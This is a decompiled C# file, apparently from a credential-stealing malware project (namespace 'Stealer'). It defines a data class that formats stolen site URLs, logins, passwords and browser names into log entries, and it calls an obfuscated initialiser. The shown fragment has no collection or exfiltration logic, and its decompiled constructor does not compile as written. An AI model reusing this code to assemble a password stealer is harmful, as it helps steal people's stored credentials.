using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Stealer
{
	// Token: 0x0200001A RID: 26
	public class LogPassData
	{
		// Token: 0x06000117 RID: 279 RVA: 0x0000926C File Offset: 0x0000746C
		public override string ToString()
		{
			return string.Format("――――――――――――――――――――――――――――――――――――――――――――\r\nSite     | {0}\r\nLogin    | {1}\r\nPassword | {2}\r\nBrowser  | {3}\r\n", new object[]
			{
				this.Url,
				this.Login,
				this.Password,
				this.Program
			});
		}

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000118 RID: 280 RVA: 0x000029D5 File Offset: 0x00000BD5
		// (set) Token: 0x06000119 RID: 281 RVA: 0x000029DD File Offset: 0x00000BDD
		public string Login { get; set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x0600011A RID: 282 RVA: 0x000029E6 File Offset: 0x00000BE6
		// (set) Token: 0x0600011B RID: 283 RVA: 0x000029EE File Offset: 0x00000BEE
		public string Password { get; set; }

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x0600011C RID: 284 RVA: 0x000029F7 File Offset: 0x00000BF7
		// (set) Token: 0x0600011D RID: 285 RVA: 0x000029FF File Offset: 0x00000BFF
		public string Program { get; set; }

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x0600011E RID: 286 RVA: 0x00002A08 File Offset: 0x00000C08
		// (set) Token: 0x0600011F RID: 287 RVA: 0x00002A10 File Offset: 0x00000C10
		public string Url { get; set; }

		// Token: 0x06000120 RID: 288 RVA: 0x0000276F File Offset: 0x0000096F
		public LogPassData()
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
		}

		// Token: 0x04000042 RID: 66
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private string string_0;

		// Token: 0x04000043 RID: 67
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_1;

		// Token: 0x04000044 RID: 68
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_2;

		// Token: 0x04000045 RID: 69
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private string string_3;
	}
}
